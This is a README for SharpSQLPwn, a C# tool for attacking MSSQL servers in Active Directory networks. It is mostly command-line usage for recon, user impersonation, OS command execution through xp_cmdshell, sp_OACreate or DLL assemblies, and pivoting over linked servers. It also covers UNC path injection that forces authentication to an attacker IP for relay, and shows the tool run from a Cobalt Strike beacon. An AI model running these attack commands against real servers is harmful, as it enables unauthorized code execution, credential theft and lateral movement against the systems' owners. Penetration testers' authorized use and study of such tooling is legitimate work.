# SharpSQLPwn

C# tool to identify and exploit weaknesses with MSSQL instances in Active Directory environments

```
.\SharpSQLPwn.exe /help

   _____ __                    _____ ____    __    ____
  / ___// /_  ____ __________ / ___// __ \  / /   / __ \_      ______
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ / / / / /   / /_/ / | /| / / __ \
 ___/ / / / / /_/ / /  / /_/ /__/ / /_/ / / /___/ ____/| |/ |/ / / / /
/____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/
                     /_/
   https://github.com/lefayjey/SharpSQLPwn
   Author:  lefayjey


Usage:
    - Basic recon (Windows Authentication):
        SharpSQLPwn.exe /modules:R /target:SQLServer [/auth:Windows] [/db:DatabaseName]
    - Basic recon (Local Authentication):
        SharpSQLPwn.exe /modules:R /target:SQLServer /auth:Local /user:Username /pass:Password [/db:DatabaseName]
    - Basic recon (Azure Authentication):
        SharpSQLPwn.exe /modules:R /target:SQLServer /auth:Azure /domain:Domain /user:Username /pass:Password[/db:DatabaseName]
    - Impersonation:
        SharpSQLPwn.exe /modules:I /target:SQLServer [/db:DatabaseName] /impuser:ImpersonatedUser
    - Run Query (Optional: add module I to impersonate user before running query):
        SharpSQLPwn.exe /modules:Q[I] /target:SQLServer [/db:DatabaseName] /query:CustomQuery [/impuser:ImpersonatedUser]
    - Command Execution (Optional: add module I to impersonate user before command execution):
        SharpSQLPwn.exe /modules:C[I] /target:SQLServer [/db:DatabaseName] /cmdtech:CmdExecTechnique /cmd:Command [/impuser:ImpersonatedUser]
    - UNC Path Injection (Optional: add module I to impersonate user before path injection):
        SharpSQLPwn.exe /modules:U[I] /target:SQLServer [/db:DatabaseName] /localIP:AttackerIP [/impuser:ImpersonatedUser]
    - Linked Servers (Optional: add module C to execute command on linked SQL server, and module U to perform path injection, add module Q to run custom query):
        SharpSQLPwn.exe /modules:L[CUQ] /target:SQLServer [/db:DatabaseName] /linkedsql:LinkedSQLServer [/cmdtech:CmdExecTechnique] [/cmd:Command] [/localIP:AttackerIP] [/query:CustomQuery]
    - Interactive mode:
        SharpSQLPwn.exe /interactive

Arguments:
    /target      - Target SQL server hostname or IP (default: LocalMachine)
    /db          - Database name of target SQL server (default: master)
    /auth        - Authention method (default: Windows)
            Windows
            Local (Requires /user:Username /pass:Password)
            Azure (Requires /domain:Domain /user:Username /pass:Password)
    /user        - Username (for Local and Azure authentication methods)
    /pass        - Password (for Local and Azure authentication methods)
    /domain      - Domain (for Azure authentication method only)
    /modules     - Specify modules to run (default: R). Choose multiple modules by concatening letters, example: /modules:RI
            R=Recon
            I=Impersonation
            Q=CustomQuery
            C=CommandExecution
            U=UNCPathInjection
            L=LinkedSQL
    /impuser     - Name of user to impersonate (default: sa)
    /query       - Custom SQL query to run
    /cmdtech     - Specify execution technique (default: 1)
            1=xp_cmdshell
            2=sp_OACreate
            3=dll_assembly
    /cmd         - Command to execute
    /localIP     - Local IP of the attacker (used for responder or ntlmrelay or Inveigh)
    /linkedsql   - Target linked SQL Server Hostname or IP
    /interactive - Run Interactive version
    /help        - Show this help message
```

## CobaltStrike Execute-Assembly
```
beacon> execute-assembly C:\path\to\SharpSQLPwn.exe
[*] Tasked beacon to run .NET program: SharpSQLPwn.exe
[+] host called home, sent: 151099 bytes
[+] received output:

   _____ __                    _____ ____    __    ____     
  / ___// /_  ____ __________ / ___// __ \  / /   / __ \_      ______ 
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ / / / / /   / /_/ / | /| / / __ \
 ___/ / / / / /_/ / /  / /_/ /__/ / /_/ / / /___/ ____/| |/ |/ / / / /
/____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/ 
                     /_/                                              
   https://github.com/lefayjey/SharpSQLPwn
   Author:  lefayjey
```

## Credits

- [ananth-she11z](https://github.com/ananth-she11z/) - AutoSQL
- [skahwah](https://github.com/skahwah/) - SQLRecon

## Legal Disclamer

Usage of SharpSQLPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.